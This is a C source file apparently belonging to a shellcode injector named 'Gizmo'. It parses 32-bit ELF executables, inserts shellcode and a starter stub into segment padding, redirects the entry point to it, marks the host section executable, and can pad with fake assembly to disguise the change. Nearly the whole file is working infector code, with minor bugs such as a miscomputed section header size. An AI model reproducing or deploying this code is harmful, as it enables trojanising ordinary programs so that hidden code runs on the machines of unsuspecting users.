/*
 * elf.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include <elf.h>

#include "io.h"
#include "shbuf.h"
#include "shells.h"
#include "elf_ext.h"
#include "asm.h"
#include "gfx.h"

extern int verbose, asm_garbage;

/*
 * gizmo_print_elfimage, print given image
 * * image, given image
 */

void gizmo_print_elfimage(gizmo_elf *image) {

	gfx_box("ELF Image (%s):", image->raw->filename);
	printf("\n");

	printf("* Entry Point: 0x%08x\n", image->hdrs->ehdr->e_entry);
	
	if (verbose) {

		if (image->hdrs->phdr) {

			printf("\n");
			printf("\t* Program Header (%d bytes):\n", image->hdrs->ehdr->e_phentsize * image->hdrs->ehdr->e_phnum);
			printf("\t\t- Entry Size: %d bytes\n", image->hdrs->ehdr->e_phentsize);
			printf("\t\t- Total Entries: %d\n", image->hdrs->ehdr->e_phnum);
			printf("\t\t- Physical Offset: %d\n", image->hdrs->ehdr->e_phoff);
		}

		if (image->hdrs->shdr) {

			printf("\n");
			printf("\t* Section Header (%d bytes):\n", image->hdrs->ehdr->e_shentsize * image->hdrs->ehdr->e_shentsize);
			printf("\t\t- Entry Size: %d bytes\n", image->hdrs->ehdr->e_shentsize);
			printf("\t\t- Total Entries: %d\n", image->hdrs->ehdr->e_shnum);
			printf("\t\t- Physical Offset: %d\n", image->hdrs->ehdr->e_shoff);
		}
	}	

	if (image->shcode) {

		printf("\n");
		printf("\t* Gizmo (%d bytes):\n", image->shcode->sh_len + image->shcode->data_len);
		printf("\t\t- Enviroment: %s/%s\n", image->shcode->platform, image->shcode->arch);
		printf("\t\t- Description: %s\n", image->shcode->desc);
		printf("\t\t- Shellcode Length: %d bytes\n", image->shcode->sh_len);
		printf("\t\t- Generated Starter Length: %d bytes\n", image->shcode->data_len);

		if (verbose) {
			
			if (image->gizmo_attributes) {
				printf("\t\t- Padding Found: %d bytes\n", image->gizmo_attributes->padding_length);
				printf("\t\t- Virtual Offset: 0x%08x\n", image->gizmo_attributes->gizmo_vrt_off);
				printf("\t\t- Physical Offset: %d\n", image->gizmo_attributes->gizmo_raw_off);
				printf("\t\t- Resident: %s\n", image->gizmo_attributes->gizmo_section);
				printf("\t\t- Fake Assembly Padding: %s\n", (asm_garbage) ? "Yes" : "No");
				
				if (asm_garbage) {

					printf("\t\t- Fake Assembly Length: %d bytes\n", 
						image->gizmo_attributes->padding_length - (image->shcode->sh_len + image->shcode->data_len));

				}
			}
		}
	}

	printf("\n");
	return ;
}

/*
 * elf_getsctbyname, get section entry by name
 * * image, given ELF image
 * * sctname, given section name
 */

Elf32_Shdr *gizmo_elf_getsctbyname(gizmo_elf *image, char *sctname) {
	int idx;
	char *cur_sct;

	if (!image->hdrs->str_tbl) {
		return NULL;
	}

        for (idx = 0; idx < image->hdrs->ehdr->e_shnum; idx++) {

                cur_sct = image->hdrs->str_tbl + image->hdrs->shdr[idx].sh_name;

                if (!strcmp(sctname, cur_sct)) {
			return &image->hdrs->shdr[idx];
		}
	}

	return NULL;
}


/*
 * elf_verifyhdr, verify ELF header
 * * ehdr, given ELF header
 */

int elf_verifyhdr(Elf32_Ehdr *ehdr) {

        if ( (ehdr->e_type != ET_EXEC && ehdr->e_type != ET_DYN) || 
		(ehdr->e_machine != EM_386) || (ehdr->e_version != EV_CURRENT) || 
			(!ehdr->e_shoff || !ehdr->e_phoff) )
	{
		return 0;
	}
	
	return 1;
}

/*
 * gizmo_elf_free, clean up leftovers
 * * image, given ELF image
 */

void gizmo_elf_free(gizmo_elf *image) {
	
	if (image) {
	
		if (image->raw->fp) {
			fclose(image->raw->fp);
		}

		if (image->raw->filename) {
			free(image->raw->filename);
		}

		if (image->hdrs) {

			if (image->hdrs->ehdr) { free(image->hdrs->ehdr); }
			if (image->hdrs->phdr) { free(image->hdrs->phdr); }
			if (image->hdrs->shdr) { free(image->hdrs->shdr); }

			if (image->hdrs->str_tbl) { free(image->hdrs->str_tbl); }

			free(image->hdrs);
		}

		if (image->gizmo_attributes) {
			free(image->gizmo_attributes);
		}

		free(image);
	}

	return ;
}

/*
 * gizmo_elf_analyze, analyze given ELF
 * * file, given ELF filename
 */

gizmo_elf *gizmo_elf_analyze(char *file) {
	gizmo_elf *src;

	src = calloc(1, sizeof(gizmo_elf));

	if (!src) {
		perror("calloc");
		return NULL;
	}

	src->hdrs = calloc(1, sizeof(gizmo_elf_hdrs));
	src->raw = calloc(1, sizeof(gizmo_elf_raw));

	if (!src->hdrs || !src->raw) {
		perror("calloc");
		gizmo_elf_free(src);
		return NULL;
	}

	src->raw->fp = fopen(file, "r");

	if (!src->raw->fp) {
		perror(file);
		gizmo_elf_free(src);
		return NULL;
	}

	src->hdrs->ehdr = io_getchunk(src->raw->fp, 0, sizeof(Elf32_Ehdr));

	if (!src->hdrs->ehdr) {
		perror("calloc");
		gizmo_elf_free(src);
		return NULL;
	}

	if (!elf_verifyhdr(src->hdrs->ehdr)) {
		printf("*** %s isn't a valid ELF binary!\n", file);
		gizmo_elf_free(src);
		return NULL;
	}	

	src->hdrs->phdr = io_getchunk(src->raw->fp, src->hdrs->ehdr->e_phoff, src->hdrs->ehdr->e_phnum * src->hdrs->ehdr->e_phentsize);

	if (!src->hdrs->phdr) {
		perror(file);
		gizmo_elf_free(src);
		return NULL;
	}

	src->hdrs->shdr = io_getchunk(src->raw->fp, src->hdrs->ehdr->e_shoff, src->hdrs->ehdr->e_shnum * src->hdrs->ehdr->e_shentsize);

	if (!src->hdrs->shdr) {
		perror(file);
		gizmo_elf_free(src);
		return NULL;
	}

	if (src->hdrs->ehdr->e_shstrndx != SHN_UNDEF) {
		Elf32_Shdr *strsct;
		strsct = src->hdrs->shdr + src->hdrs->ehdr->e_shstrndx;
		src->hdrs->str_tbl = io_getchunk(src->raw->fp, strsct->sh_offset, strsct->sh_size);

		if (!src->hdrs->str_tbl) {
			perror(file);
			gizmo_elf_free(src);
			return NULL;
		}
	}

	return src;
}

/*
 * gizmo_elf_modifyphdr, modify ELF program header table
 * * image, given ELF image
 */

int gizmo_elf_modifyphdr(gizmo_elf *image) {
	int idx;
	Elf32_Phdr *phdr;

	phdr = image->hdrs->phdr;

	for (idx = 0; idx < image->hdrs->ehdr->e_phnum; idx++) {

		if (image->gizmo_attributes->gizmo_raw_off) {

			phdr[idx].p_offset += PAGE_SIZE;
			continue;
		}

		if (phdr[idx].p_type == PT_LOAD && phdr[idx].p_offset == 0) {

			image->gizmo_attributes->gizmo_vrt_off = phdr[idx].p_vaddr + phdr[idx].p_memsz;
			image->gizmo_attributes->gizmo_raw_off = phdr[idx].p_offset + phdr[idx].p_filesz;
			image->gizmo_attributes->padding_length = PAGE_SIZE - (image->gizmo_attributes->gizmo_vrt_off & (PAGE_SIZE - 1));
			image->hdrs->ehdr->e_entry = image->gizmo_attributes->gizmo_vrt_off;

			if (image->gizmo_attributes->padding_length < (image->shcode->sh_len + image->shcode->data_len)) {

				fprintf(stderr, "*** %s : Not enough padding length (%d bytes) for Gizmo (%d bytes), Rollback!\n", 
					image->raw->filename, image->gizmo_attributes->padding_length, 
						(image->shcode->sh_len + image->shcode->data_len));
			
				return 0;
			}

			phdr[idx].p_filesz += (image->shcode->sh_len + image->shcode->data_len);
			phdr[idx].p_memsz += (image->shcode->sh_len + image->shcode->data_len);

			if (asm_garbage) {
				phdr[idx].p_filesz += (image->gizmo_attributes->padding_length - (image->shcode->sh_len + image->shcode->data_len));
				phdr[idx].p_memsz += (image->gizmo_attributes->padding_length - (image->shcode->sh_len + image->shcode->data_len));
			}
		}
	}

	if (!image->gizmo_attributes->gizmo_vrt_off) {

		fprintf(stderr, "*** %s : Unable to locate suitable LOADABLE segement, Rollback!\n", image->raw->filename);
		return 0;

	}

	return 1;
}

/*
 * gizmo_elf_modifyshdr, modify ELF section header table
 * * image, given ELF image
 */

int gizmo_elf_modifyshdr(gizmo_elf *image) {
	int idx;
	Elf32_Shdr *shdr;

	shdr = image->hdrs->shdr;

	for (idx = 0; idx < image->hdrs->ehdr->e_shnum; idx++) {

		if (shdr[idx].sh_offset >= image->gizmo_attributes->gizmo_raw_off) {
			shdr[idx].sh_offset += PAGE_SIZE;
			continue;
		}

		if (shdr[idx].sh_addr + shdr[idx].sh_size == image->hdrs->ehdr->e_entry) {

			shdr[idx].sh_size += (image->shcode->sh_len + image->shcode->data_len);
	
			if (asm_garbage) {
				shdr[idx].sh_size += (image->gizmo_attributes->padding_length - (image->shcode->sh_len + image->shcode->data_len));
			}

			if (!(shdr[idx].sh_flags & SHF_EXECINSTR)) {
				shdr[idx].sh_flags |= SHF_EXECINSTR;
			}

			if (image->hdrs->str_tbl) {
				image->gizmo_attributes->gizmo_section = image->hdrs->str_tbl + shdr[idx].sh_name;
			}

			image->hdrs->ehdr->e_entry += image->shcode->data_len;
		}
	}

	if (image->hdrs->ehdr->e_shoff >= image->gizmo_attributes->gizmo_raw_off) {
		image->hdrs->ehdr->e_shoff += PAGE_SIZE;
	}

	return 1;
}

/*
 * gizmo_elf_builder, build ELF file
 * * src, given source ELF image
 * * dst, given destnation ELF image
 */

int gizmo_elf_builder(gizmo_elf *src, gizmo_elf *dst) {
	int offset, gizmo_len;
	char pad[PAGE_SIZE];
	shbuf *data;
	void *rval;

	data = rval = NULL;

	if (dst->shcode->gizmo_preproc) {

		data = dst->shcode->gizmo_preproc(src, dst);

		if (!data || !data->buf) {

			if (data) {
				shbuf_free(data);
			}

			return 0;
		}
	}

	gizmo_len = dst->shcode->sh_len + dst->shcode->data_len;

	if ( (!fwrite(dst->hdrs->ehdr, sizeof(Elf32_Ehdr), 1, dst->raw->fp)) || 
		(!fwrite(dst->hdrs->phdr, dst->hdrs->ehdr->e_phentsize, dst->hdrs->ehdr->e_phnum, dst->raw->fp)) )
	{
		perror(dst->raw->filename);
		return 0;
	}

	offset = sizeof(Elf32_Ehdr) + (dst->hdrs->ehdr->e_phentsize * dst->hdrs->ehdr->e_phnum);

	if (!io_chunkcpy(src->raw->fp, dst->raw->fp, offset, dst->gizmo_attributes->gizmo_raw_off - offset, PAGE_SIZE)) {

		perror(dst->raw->filename);
		return 0;
	}

	if (data) {
	
		if (!fwrite(data->buf, dst->shcode->data_len, 1, dst->raw->fp)) {
			shbuf_free(data);
			perror(dst->raw->filename);
			return 0;
		}

		shbuf_free(data);
	}

	gizmo_asmgen((char *) &pad, PAGE_SIZE - gizmo_len);

	if ( (!fwrite(dst->shcode->sh, dst->shcode->sh_len, 1, dst->raw->fp)) || 
		(!fwrite(pad, PAGE_SIZE - gizmo_len, 1, dst->raw->fp)) ||
			(!io_chunkcpy(src->raw->fp, dst->raw->fp, ftell(src->raw->fp), src->hdrs->ehdr->e_shoff - dst->gizmo_attributes->gizmo_raw_off, PAGE_SIZE)) ||
				(!fwrite(dst->hdrs->shdr, dst->hdrs->ehdr->e_shentsize, dst->hdrs->ehdr->e_shnum, dst->raw->fp)) )
	{
		perror(dst->raw->filename);
		return 0;
	}
	
	offset = src->hdrs->ehdr->e_shoff + (dst->hdrs->ehdr->e_shentsize * dst->hdrs->ehdr->e_shnum);

	if (!io_chunkcpy(src->raw->fp, dst->raw->fp, offset, io_filesize(src->raw->fp) - offset, PAGE_SIZE)) {
		return 0;
	}

	if (dst->shcode->gizmo_postproc) {

		rval = dst->shcode->gizmo_postproc(src, dst);

		if (!rval) {
			return 0;
		}
	}
	
	return 1;
}

/*
 * gizmo_elf_duphdrs, duplicate ELF image core headers
 * * orighdrs, original core hdrs
 */

gizmo_elf_hdrs* gizmo_elf_duphdrs(gizmo_elf_hdrs *orighdrs) {
	gizmo_elf_hdrs *ptr;

	ptr = calloc(1, sizeof(gizmo_elf_hdrs));

	ptr->ehdr = calloc(1, sizeof(Elf32_Ehdr));

	if (!ptr || !ptr->ehdr) {

		if (ptr) {
			free(ptr);
		}

		return NULL;
	}

	memcpy((void *)ptr->ehdr, orighdrs->ehdr, sizeof(Elf32_Ehdr));

	ptr->phdr = calloc(ptr->ehdr->e_phnum, ptr->ehdr->e_phentsize);

	if (!ptr->phdr) {
		free(ptr->ehdr);
		free(ptr);
		return NULL;
	}

	memcpy((void *)ptr->phdr, orighdrs->phdr, ptr->ehdr->e_phnum * ptr->ehdr->e_phentsize);

	ptr->shdr = calloc(ptr->ehdr->e_shnum, ptr->ehdr->e_shentsize);

	if (!ptr->shdr) {
		free(ptr->ehdr);
		free(ptr->phdr);
		free(ptr);
		return NULL;
	}

	memcpy((void *)ptr->shdr, orighdrs->shdr, ptr->ehdr->e_shnum * ptr->ehdr->e_shentsize);
	
	if (orighdrs->str_tbl) {

		Elf32_Shdr *strsct;

                strsct = orighdrs->shdr + orighdrs->ehdr->e_shstrndx;
		
		ptr->str_tbl = calloc(1, strsct->sh_size);

		if (!ptr->str_tbl) {
			free(ptr->ehdr);
			free(ptr->phdr);
			free(ptr->shdr);
			free(ptr);
			return NULL;
		}

		memcpy((void *)ptr->str_tbl, orighdrs->str_tbl, strsct->sh_size);
	}

	return ptr;
}

/*
 * gizmo_elf_processor, perform the whole process
 * * src, given source filename
 * * dst, given dest filename
 * * gizmo, given gizmo
 */

int gizmo_elf_processor(char *src, char *dst, gizmo_shcode *gizmo) {
	gizmo_elf *orig_image, *mod_image;
	int rval = 0;

	orig_image = gizmo_elf_analyze(src);

	if (!orig_image) {
		perror("calloc");
		return 0;
	}

	mod_image = calloc(1, sizeof(gizmo_elf));

	if (!mod_image) {
		perror("calloc");
		gizmo_elf_free(orig_image);
		return 0;
	}

	mod_image->gizmo_attributes = calloc(1, sizeof(gizmo_elf_attrs));
	mod_image->hdrs = calloc(1, sizeof(gizmo_elf_hdrs));
	mod_image->raw = calloc(1, sizeof(gizmo_elf_raw));

	if (!mod_image->hdrs || !mod_image->gizmo_attributes || !mod_image->raw) {
		perror("calloc");
		gizmo_elf_free(mod_image);
		gizmo_elf_free(orig_image);
		return 0;
	}

	remove(dst);

	mod_image->raw->fp = fopen(dst, "a");

	if (!mod_image->raw->fp) {
		perror(dst);
		gizmo_elf_free(orig_image);
		gizmo_elf_free(mod_image);
		return 0;
	}

	orig_image->raw->filename = strdup(src);
	mod_image->raw->filename = strdup(dst);
	mod_image->shcode = gizmo;

	free(mod_image->hdrs);

	mod_image->hdrs = gizmo_elf_duphdrs(orig_image->hdrs);

	if ( (!gizmo_elf_modifyphdr(mod_image)) || 
		(!gizmo_elf_modifyshdr(mod_image)) || 
			(!gizmo_elf_builder(orig_image, mod_image)) ) 
	{
		rval = 1;
	}

	if (!rval) {
		gizmo_print_elfimage(orig_image);
		gizmo_print_elfimage(mod_image);
	}

	gizmo_elf_free(mod_image);
	gizmo_elf_free(orig_image);

	return rval;
}

